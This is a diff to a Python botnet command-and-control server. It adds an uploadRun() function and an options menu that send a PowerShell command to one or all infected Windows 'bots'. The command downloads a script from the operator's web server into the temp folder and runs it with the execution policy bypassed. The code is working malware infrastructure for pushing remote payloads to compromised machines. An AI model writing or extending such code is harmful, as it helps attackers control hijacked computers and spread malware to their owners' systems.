@@ -17,6 +17,7 @@ import socketserver
 bots=[]
 PingBots=[]
 myip="192.168.1.8"
+father = myip
 # You have to start httpd on this port:
 httpPort=6080
 # This port gets all shell sessions
@@ -25,7 +26,10 @@ port = 6061
 pingPort=6066
 # Debug mode
 debug = 0
-
+# The location of the main http server
+HTTPServerLocation="/var/www/html/mb"
+HTTPServerMS17Location="/s"
+HTTPServerOptionLocation=HTTPServerLocation+"/os"
 
 """
 Start listening
@@ -228,6 +232,111 @@ def SR(command,conn,r_buffer,waitForData):
             return
     except:
             return
+
+"""
+It will downlaod a script from /mb/os then run it on one bot or all of them.
+Filename: the name of the file in /var/www/html/mb/os.
+
+
+TODO: Make sure that the files have different names.
+"""
+def uploadRun(bot,filename):
+    # Setup the command.
+
+    # This command is just to upload the script.
+    string = "powershell "
+    string += "$url = http://"+father+"/mb/os/"+filename+"; "
+    string += "$save_dir = $env:temp; "
+    string += "$Location = '' + $save_dir + '\\' + '"+filename+"'; "
+    string += "$wgetBinLocation = '' + $save_dir + '\\ wget.exe'; "
+    string += "Start-Process -FilePath $wgetBinLocation -Args '$url -O $Location' -passthru -NoNewWindow -Wait; "
+    command = string + "\r\n"
+
+    # Execution command
+    executionString = "Powershell -ExecutionPolicy ByPass -File '$env:temp\\'"+filename+"' "
+
+    # When you target all bots
+    if bot is None:
+        # The commands:
+        # wget should be always at $env:temp ALWAYS!!!!!!!!!
+        # Execution
+        C2A(command)
+        command = executionString + "\r\n"
+        # Execute the script.
+        C2A(command)
+        pass
+    else:
+        addr = bot[1]
+        conn = bot[0]
+        ip = addr[0]
+        # Execution
+        try:
+            # Upload.
+            SR(command,conn,6282,0)
+            command = executionString + "\r\n"
+            # Execute the script.
+            SR(command,conn,6282,0)
+            print(str(ip)+" uploadRun() - Received")
+        except KeyboardInterrupt:
+            return
+        except:
+            if debug:
+                print("Error in uploadRun(bot,filename) when sending to "+str(ip))
+
+"""
+Options mode
+Which will use a pre made http server that will have all scripts in order.
+so option 1 will be 1.ps1 at the dir on /var/www/mb
+if u want to add a new script just add it to /var/www/mb
+
+"""
+def options():
+    # It will use this C2A() method
+    pass
+
+
+"""
+Options mode handler
+"""
+def optionsHandler():
+    # list all options u have at HTTPServerOptionLocation
+    #
+    proc = execute_command("ls "+HTTPServerOptionLocation)
+    stdout = proc.communicate()[0].split(' ')
+    options = stdout
+    print("Print all options")
+    for option in options:
+        print(option)
+
+    while True:
+        try:
+            # Get input
+            filename = s_input("Options:~")
+            towho = s_input("Enter a port or all:~")
+            bot = find_bot(towho)
+            if len(bot) <= 0:
+                bot = None
+            # If it's exit get out
+            if filename == 'exit':
+                return
+            # Are you sure?
+            condition = s_input("Do you want to send ->'"+filename+"' to all bots? [y/N]")
+            # Make sure that you want to send it.
+            if condition == "y" or condition == "Y":
+                print("Sending..")
+
+                # This function will handle the rest
+                # Read its description if u want to understand it.
+                uploadRun(bot, filename)
+            else:
+                print("No data has sent")
+                #
+        except KeyboardInterrupt:
+            return
+        except:
+            print("Error in C2AHandler")
+            return
+
 
 """
 Read from the console and send it to a specific bot 
